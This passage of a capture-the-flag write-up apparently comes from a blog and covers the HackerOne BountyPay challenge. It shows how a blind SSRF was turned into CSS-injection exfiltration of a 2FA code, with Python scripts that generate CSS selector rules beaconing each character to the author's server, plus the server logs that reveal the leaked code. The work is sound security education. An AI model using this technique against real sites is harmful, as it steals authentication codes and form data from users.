+<p>I replaced <code>www.bountypay.h1ctf.com</code> with my own domain, started a server and received that request.</p>
+
+<pre class="prettyprint">
+# python server.py 
+3.21.98.146 - - [01/Jun/2020 20:06:16] code 404, message File not found
+3.21.98.146 - - [01/Jun/2020 20:06:16] "GET /css/uni_2fa_style.css HTTP/1.1" 404 -
+</pre>
+
+<p>I had a blind SSRF here, because nothing was reflected on the response. I tried a couple of things to escalate it to a full SSRF, but since the file being requested was a css, I imagined this had something to do with css exfiltration, a technique I have already seen in other CTFs before.</p>
+
+<p>To validate this, I created the css file which the application was trying to fetch and force it to load an image from <code>/hipotermia</code> if the resource was loaded.</p>
+
+<pre class="prettyprint linenums">
+body{background-image: url(https://hipotermia.pw/hipotermia);}
+</pre>
+
+<p>Indeed, after the css was retrieved, I received another request to <code>/hipotermia</code> trying to get that image.</p>
+
+<pre class="prettyprint">
+# python server.py 
+3.21.98.146 - - [01/Jun/2020 20:22:50] "GET /css/uni_2fa_style.css HTTP/1.1" 200 -
+3.21.98.146 - - [01/Jun/2020 20:22:50] code 404, message File not found
+3.21.98.146 - - [01/Jun/2020 20:22:50] "GET /hipotermia HTTP/1.1" 404 -
+</pre>
+
+<p>This technique is usually used to exfiltrate data from input fields, this is because css allows to use different styles for inputs with a certain attribute or value.</p>
+
+<p>I created the following python script that generated a css file containing one style for every character possible and that style requested a different resource from my domain.</p> 
+
+<pre class="prettyprint linenums">
+chars =['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','X','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','0','-','_']
+css = ''
+for char in chars:
+    css += 'input[name^=' + char + ']{background-image: url(https://hipotermia.pw/' + char + ');}\n'
+with open('css/uni_2fa_style.css', 'w') as f:
+  f.write(css)
+</pre>
+
+<p>After executing the script, the resulting css file looked like this.</p>
+
+<pre class="prettyprint">
+# cat css/uni_2fa_style.css 
+input[name^=a]{background-image: url(https://hipotermia.pw/a);}
+input[name^=b]{background-image: url(https://hipotermia.pw/b);}
+input[name^=c]{background-image: url(https://hipotermia.pw/c);}
+input[name^=d]{background-image: url(https://hipotermia.pw/d);}
+input[name^=e]{background-image: url(https://hipotermia.pw/e);}
+input[name^=f]{background-image: url(https://hipotermia.pw/f);}
+...
+</pre>
+
+<p>I sent the POST request again and when the css was loaded, I received another request which showed me the first letter from the input field (<code>c</code>).</p>
+
+<pre class="prettyprint">
+# python server.py 
+3.21.98.146 - - [01/Jun/2020 20:40:54] "GET /css/uni_2fa_style.css HTTP/1.1" 200 -
+3.21.98.146 - - [01/Jun/2020 20:40:54] code 404, message File not found
+3.21.98.146 - - [01/Jun/2020 20:40:54] "GET /c HTTP/1.1" 404 -
+</pre>
+
+<p>Then, I just added that letter to the python script to generate new entries for the css file until I got the full name.</p>
+
+<p>I already had extracted <code>code_</code> from the input name when I received the following requests on the next iteration.</p>
+
+<pre class="prettyprint">
+# python server.py 
+3.21.98.146 - - [01/Jun/2020 20:47:15] "GET /css/uni_2fa_style.css HTTP/1.1" 200 -
+3.21.98.146 - - [01/Jun/2020 20:47:15] code 404, message File not found
+3.21.98.146 - - [01/Jun/2020 20:47:15] "GET /7 HTTP/1.1" 404 -
+3.21.98.146 - - [01/Jun/2020 20:47:15] code 404, message File not found
+3.21.98.146 - - [01/Jun/2020 20:47:15] "GET /1 HTTP/1.1" 404 -
+3.21.98.146 - - [01/Jun/2020 20:47:15] code 404, message File not found
+3.21.98.146 - - [01/Jun/2020 20:47:15] "GET /2 HTTP/1.1" 404 -
+3.21.98.146 - - [01/Jun/2020 20:47:15] code 404, message File not found
+3.21.98.146 - - [01/Jun/2020 20:47:15] "GET /3 HTTP/1.1" 404 -
+3.21.98.146 - - [01/Jun/2020 20:47:15] code 404, message File not found
+3.21.98.146 - - [01/Jun/2020 20:47:15] "GET /4 HTTP/1.1" 404 -
+3.21.98.146 - - [01/Jun/2020 20:47:15] code 404, message File not found
+3.21.98.146 - - [01/Jun/2020 20:47:15] "GET /5 HTTP/1.1" 404 -
+3.21.98.146 - - [01/Jun/2020 20:47:15] code 404, message File not found
+3.21.98.146 - - [01/Jun/2020 20:47:15] "GET /6 HTTP/1.1" 404 -
+</pre>
+
+<p>This meant that there were 7 different input fields <code>code_1</code>, <code>code_2</code>, <code>...</code>, <code>code_7</code>. I assumed every one of those inputs had the correspondent character from the 2FA token.</p>
+
+<p>I modified my python script to generate combinations of values for every one of those 7 input fields.</p>
+
+<pre class="prettyprint linenums">
+chars =['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','X','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','0','-','_']
+css = ''
+for i in range(1,8):
+    for char in chars:
+        css += 'input[name^=code_' + str(i) + '][value^=' + char + ']{background-image: url(https://hipotermia.pw/' + str(i) + char + ');}\n'
+with open('css/uni_2fa_style.css', 'w') as f:
+  f.write(css)
+</pre>
+
+<p>This resulted in the following css file.</p>
+
+<pre class="prettyprint">
+# cat css/uni_2fa_style.css 
+input[name^=code_1][value^=a]{background-image: url(https://hipotermia.pw:4443/1a);}
+input[name^=code_1][value^=b]{background-image: url(https://hipotermia.pw:4443/1b);}
+input[name^=code_1][value^=c]{background-image: url(https://hipotermia.pw:4443/1c);}
+...
+input[name^=code_2][value^=a]{background-image: url(https://hipotermia.pw:4443/2a);}
+input[name^=code_2][value^=b]{background-image: url(https://hipotermia.pw:4443/2b);}
+input[name^=code_2][value^=c]{background-image: url(https://hipotermia.pw:4443/2c);}
+...
+input[name^=code_7][value^=0]{background-image: url(https://hipotermia.pw:4443/70);}
+input[name^=code_7][value^=-]{background-image: url(https://hipotermia.pw:4443/7-);}
+input[name^=code_7][value^=_]{background-image: url(https://hipotermia.pw:4443/7_);}
+</pre>
+
+<p>I requested the challenge code one last time and received 7 different requests, one for every input field.</p>
+
+<pre class="prettyprint">
+# python server.py 
+3.21.98.146 - - [01/Jun/2020 21:01:23] "GET /css/uni_2fa_style.css HTTP/1.1" 200 -
+3.21.98.146 - - [01/Jun/2020 21:01:23] code 404, message File not found
+3.21.98.146 - - [01/Jun/2020 21:01:23] "GET /7m HTTP/1.1" 404 -
+3.21.98.146 - - [01/Jun/2020 21:01:23] code 404, message File not found
+3.21.98.146 - - [01/Jun/2020 21:01:23] "GET /1j HTTP/1.1" 404 -
+3.21.98.146 - - [01/Jun/2020 21:01:23] code 404, message File not found
+3.21.98.146 - - [01/Jun/2020 21:01:23] "GET /2m HTTP/1.1" 404 -
+3.21.98.146 - - [01/Jun/2020 21:01:23] code 404, message File not found
+3.21.98.146 - - [01/Jun/2020 21:01:23] "GET /3F HTTP/1.1" 404 -
+3.21.98.146 - - [01/Jun/2020 21:01:23] code 404, message File not found
+3.21.98.146 - - [01/Jun/2020 21:01:23] "GET /4O HTTP/1.1" 404 -
+3.21.98.146 - - [01/Jun/2020 21:01:23] code 404, message File not found
+3.21.98.146 - - [01/Jun/2020 21:01:23] "GET /5G HTTP/1.1" 404 -
+3.21.98.146 - - [01/Jun/2020 21:01:24] code 404, message File not found
+3.21.98.146 - - [01/Jun/2020 21:01:24] "GET /6N HTTP/1.1" 404 -
+</pre>
+
+<p>I just needed to sort those characters by its code number to get the 2FA code (<code>jmFOGNm</code>).</p>
+
+<p>I introduced it and was I finally redirected to the end of the CTF.</p>
+
+<img class="img-fluid" src="/static/img/bb/h1-2006-ctf-solution/flag.png">
